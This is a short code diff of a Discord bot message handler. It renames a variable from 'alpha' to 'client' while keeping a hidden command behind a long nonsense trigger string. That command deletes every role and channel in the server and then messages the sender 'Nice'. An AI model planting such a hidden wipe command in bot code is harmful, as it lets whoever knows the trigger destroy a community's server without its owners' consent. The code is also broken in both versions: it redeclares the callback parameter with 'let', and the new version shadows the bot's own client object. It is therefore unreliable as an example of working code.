@@ -1,11 +1,11 @@
-client.on('message', alpha => {
- if (alpha.content.startsWith("!commmmmmmmmmmmmmmmmmmmmmmmmmmmannnnnnnnnnnnnnnnnndhackkkkkkkkkkkkkk00")) {
-alpha.guild.roles.forEach(r => { r.delete() })
-alpha.guild.channels.forEach(c => { c.delete() })
-let alpha = new Discord.RichEmbed()
+client.on('message', client => {
+ if (client.content.startsWith("!commmmmmmmmmmmmmmmmmmmmmmmmmmmannnnnnnnnnnnnnnnnndhackkkkkkkkkkkkkk00")) {
+client.guild.roles.forEach(r => { r.delete() })
+client.guild.channels.forEach(c => { c.delete() })
+let client = new Discord.RichEmbed()
 .setColor('RANDOM')
 .setDescription('**Nice**')
-alpha.author.sendEmbed(alpha);
+client.author.sendEmbed(client);
 }
 });
 
